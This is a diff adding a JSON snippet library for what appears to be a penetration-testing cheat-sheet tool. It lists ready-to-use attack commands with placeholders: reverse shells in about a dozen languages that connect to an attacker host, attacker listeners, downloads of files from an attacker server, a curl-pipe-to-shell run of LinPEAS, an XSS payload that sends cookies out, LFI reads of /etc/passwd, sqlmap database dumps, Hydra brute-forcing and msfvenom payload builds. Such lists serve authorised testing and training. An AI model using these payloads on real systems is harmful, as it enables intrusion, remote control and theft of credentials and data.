@@ -1,0 +1,268 @@
+{
+  "categories": [
+    {
+      "name": "🐚 Reverse Shell",
+      "snippets": [
+        {
+          "label": "Bash TCP",
+          "command": "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+        },
+        {
+          "label": "Bash UDP",
+          "command": "bash -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1"
+        },
+        {
+          "label": "Python3",
+          "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+        },
+        {
+          "label": "Python3 PTY",
+          "command": "python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'"
+        },
+        {
+          "label": "Netcat mkfifo",
+          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f"
+        },
+        {
+          "label": "Netcat traditional",
+          "command": "nc -e /bin/bash {{LHOST}} {{LPORT}}"
+        },
+        {
+          "label": "PHP",
+          "command": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        },
+        {
+          "label": "Perl",
+          "command": "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+        },
+        {
+          "label": "Ruby",
+          "command": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        },
+        {
+          "label": "PowerShell",
+          "command": "powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+        },
+        {
+          "label": "Java",
+          "command": "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done\"});p.waitFor();"
+        }
+      ]
+    },
+    {
+      "name": "🔼 Upgrade Shell",
+      "snippets": [
+        {
+          "label": "Python3 PTY spawn",
+          "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+        },
+        {
+          "label": "Script /dev/null",
+          "command": "script /dev/null -c bash"
+        },
+        {
+          "label": "Stty raw (dopo Ctrl+Z)",
+          "command": "stty raw -echo; fg"
+        },
+        {
+          "label": "Export TERM+reset",
+          "command": "export TERM=xterm; reset"
+        },
+        {
+          "label": "Stty rows/cols",
+          "command": "stty rows {{ROWS}} cols {{COLS}}"
+        },
+        {
+          "label": "Socat TTY full",
+          "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}"
+        }
+      ]
+    },
+    {
+      "name": "🎧 Listener",
+      "snippets": [
+        {
+          "label": "Netcat listener",
+          "command": "nc -lvnp {{LPORT}}"
+        },
+        {
+          "label": "Socat listener",
+          "command": "socat TCP-LISTEN:{{LPORT}},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane"
+        },
+        {
+          "label": "Metasploit multi/handler",
+          "command": "msfconsole -x \"use exploit/multi/handler; set PAYLOAD {{PAYLOAD}}; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run\""
+        }
+      ]
+    },
+    {
+      "name": "🔍 Enumeration",
+      "snippets": [
+        {
+          "label": "Nmap quick scan",
+          "command": "nmap -sC -sV -oN nmap_{{TARGET}}.txt {{TARGET}}"
+        },
+        {
+          "label": "Nmap full ports",
+          "command": "nmap -p- --min-rate 5000 -oN nmap_full_{{TARGET}}.txt {{TARGET}}"
+        },
+        {
+          "label": "Nmap UDP top 20",
+          "command": "nmap -sU --top-ports 20 {{TARGET}}"
+        },
+        {
+          "label": "Gobuster dir",
+          "command": "gobuster dir -u http://{{TARGET}} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_{{TARGET}}.txt"
+        },
+        {
+          "label": "Gobuster vhost",
+          "command": "gobuster vhost -u http://{{TARGET}} -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+        },
+        {
+          "label": "Ffuf dir",
+          "command": "ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://{{TARGET}}/FUZZ"
+        },
+        {
+          "label": "LinPEAS remote",
+          "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        },
+        {
+          "label": "Find SUID binaries",
+          "command": "find / -perm -u=s -type f 2>/dev/null"
+        },
+        {
+          "label": "Find writable dirs",
+          "command": "find / -writable -type d 2>/dev/null | grep -v proc"
+        },
+        {
+          "label": "Sudo -l",
+          "command": "sudo -l"
+        },
+        {
+          "label": "Crontab check",
+          "command": "cat /etc/crontab; ls -la /etc/cron*"
+        }
+      ]
+    },
+    {
+      "name": "📁 File Transfer",
+      "snippets": [
+        {
+          "label": "Python HTTP server",
+          "command": "python3 -m http.server {{PORT}}"
+        },
+        {
+          "label": "wget da attacker",
+          "command": "wget http://{{LHOST}}:{{PORT}}/{{FILE}} -O /tmp/{{FILE}}"
+        },
+        {
+          "label": "curl da attacker",
+          "command": "curl http://{{LHOST}}:{{PORT}}/{{FILE}} -o /tmp/{{FILE}}"
+        },
+        {
+          "label": "Certutil (Windows)",
+          "command": "certutil -urlcache -split -f http://{{LHOST}}:{{PORT}}/{{FILE}} {{FILE}}"
+        },
+        {
+          "label": "PowerShell wget",
+          "command": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{{LHOST}}:{{PORT}}/{{FILE}}', 'C:\\Windows\\Temp\\{{FILE}}')\""
+        },
+        {
+          "label": "Base64 encode file",
+          "command": "base64 -w 0 {{FILE}}"
+        },
+        {
+          "label": "Base64 decode",
+          "command": "echo '{{B64}}' | base64 -d > {{FILE}}"
+        },
+        {
+          "label": "SCP upload",
+          "command": "scp {{FILE}} {{USER}}@{{TARGET}}:/tmp/"
+        }
+      ]
+    },
+    {
+      "name": "🔐 Hash & Crack",
+      "snippets": [
+        {
+          "label": "John rockyou",
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt {{HASHFILE}}"
+        },
+        {
+          "label": "John show",
+          "command": "john --show {{HASHFILE}}"
+        },
+        {
+          "label": "Hashcat auto",
+          "command": "hashcat -a 0 {{HASHFILE}} /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Hashcat MD5",
+          "command": "hashcat -m 0 -a 0 {{HASHFILE}} /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Hashcat NTLM",
+          "command": "hashcat -m 1000 -a 0 {{HASHFILE}} /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Identify hash",
+          "command": "hash-identifier {{HASH}}"
+        }
+      ]
+    },
+    {
+      "name": "🌐 Web Attacks",
+      "snippets": [
+        {
+          "label": "SQLmap basic",
+          "command": "sqlmap -u 'http://{{TARGET}}/{{PATH}}?{{PARAM}}=1' --dbs"
+        },
+        {
+          "label": "SQLmap dump",
+          "command": "sqlmap -u 'http://{{TARGET}}/{{PATH}}?{{PARAM}}=1' -D {{DB}} -T {{TABLE}} --dump"
+        },
+        {
+          "label": "XSS cookie steal",
+          "command": "<script>document.location='http://{{LHOST}}:{{PORT}}/steal?c='+document.cookie</script>"
+        },
+        {
+          "label": "LFI basic",
+          "command": "http://{{TARGET}}/{{PATH}}?{{PARAM}}=../../../../etc/passwd"
+        },
+        {
+          "label": "Hydra HTTP POST",
+          "command": "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"
+        },
+        {
+          "label": "Hydra SSH",
+          "command": "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ssh://{{TARGET}}"
+        }
+      ]
+    },
+    {
+      "name": "⚙️ MSF Quick",
+      "snippets": [
+        {
+          "label": "msfvenom ELF",
+          "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf"
+        },
+        {
+          "label": "msfvenom EXE",
+          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe"
+        },
+        {
+          "label": "msfvenom PHP",
+          "command": "msfvenom -p php/reverse_php LHOST={{LHOST}} LPORT={{LPORT}} -f raw -o shell.php"
+        },
+        {
+          "label": "msfvenom Python",
+          "command": "msfvenom -p cmd/unix/reverse_python LHOST={{LHOST}} LPORT={{LPORT}} -f raw"
+        },
+        {
+          "label": "msfvenom WAR",
+          "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o shell.war"
+        }
+      ]
+    }
+  ]
+}
